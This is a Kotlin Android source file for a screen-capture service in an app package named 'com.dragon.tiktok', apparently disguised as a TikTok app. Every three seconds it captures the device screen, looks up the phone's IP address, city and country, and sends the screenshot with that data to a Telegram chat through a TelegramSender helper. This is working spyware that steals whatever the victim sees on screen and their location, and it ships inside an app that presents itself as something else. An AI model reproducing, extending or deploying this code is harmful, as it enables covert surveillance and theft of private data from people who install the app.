package com.dragon.tiktok.services

import android.app.*
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.DisplayMetrics
import android.util.Log
import androidx.core.app.NotificationCompat
import com.dragon.tiktok.R
import com.dragon.tiktok.utils.IPGeoHelper
import com.dragon.tiktok.utils.TelegramSender
import kotlinx.coroutines.*
import java.io.ByteArrayOutputStream
import java.security.MessageDigest

class ScreenCaptureService : Service() {

    private lateinit var mediaProjection: MediaProjection
    private lateinit var virtualDisplay: VirtualDisplay
    private lateinit var imageReader: ImageReader
    private val handler = Handler(Looper.getMainLooper())
    private var running = true
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        createNotification()
        val resultCode = intent?.getIntExtra("resultCode", -1) ?: -1
        val data = intent?.getParcelableExtra<Intent>("data")
        if (resultCode == -1 || data == null) {
            stopSelf()
            return START_NOT_STICKY
        }
        val projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        mediaProjection = projectionManager.getMediaProjection(resultCode, data)
        startScreenCapture()
        return START_STICKY
    }

    private fun createNotification() {
        val channelId = "screen_channel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "Запись экрана",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
        val notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("Запись экрана")
            .setContentText("Идёт трансляция")
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .build()
        startForeground(1002, notification)
    }

    private fun startScreenCapture() {
        val metrics = DisplayMetrics()
        val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        windowManager.defaultDisplay.getMetrics(metrics)
        val width = metrics.widthPixels
        val height = metrics.heightPixels
        val density = metrics.densityDpi

        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
        virtualDisplay = mediaProjection.createVirtualDisplay(
            "ScreenCapture",
            width, height, density,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader.surface, null, null
        )

        // Захват каждые 3 секунды
        handler.post(object : Runnable {
            override fun run() {
                if (!running) return
                captureAndSend()
                handler.postDelayed(this, 3000)
            }
        })
    }

    private fun captureAndSend() {
        val image = imageReader.acquireLatestImage() ?: return
        val planes = image.planes
        val buffer = planes[0].buffer
        val pixelStride = planes[0].pixelStride
        val rowStride = planes[0].rowStride
        val rowPadding = rowStride - pixelStride * image.width

        val bitmap = Bitmap.createBitmap(
            image.width + rowPadding / pixelStride,
            image.height,
            Bitmap.Config.ARGB_8888
        )
        bitmap.copyPixelsFromBuffer(buffer)
        image.close()

        serviceScope.launch {
            try {
                val baos = ByteArrayOutputStream()
                bitmap.compress(Bitmap.CompressFormat.PNG, 90, baos)
                val imageBytes = baos.toByteArray()
                val hash = sha256(imageBytes).take(12)
                val geo = IPGeoHelper.getGeo()
                val time = System.currentTimeMillis().toString()
                val caption = "🧠 Хеш: $hash\n🌍 IP: ${geo.ip}\n📍 ${geo.city}, ${geo.country}\n⏰ $time\n🤖 Переходник - @AdapterRendy"

                TelegramSender.sendImage(imageBytes, caption)
            } catch (e: Exception) {
                Log.e("ScreenCapture", "Ошибка отправки скрина", e)
            } finally {
                bitmap.recycle()
            }
        }
    }

    private fun sha256(data: ByteArray): String {
        val digest = MessageDigest.getInstance("SHA-256")
        val hash = digest.digest(data)
        return hash.joinToString("") { "%02x".format(it) }
    }

    override fun onDestroy() {
        super.onDestroy()
        running = false
        handler.removeCallbacksAndMessages(null)
        virtualDisplay.release()
        mediaProjection.stop()
        serviceScope.cancel()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}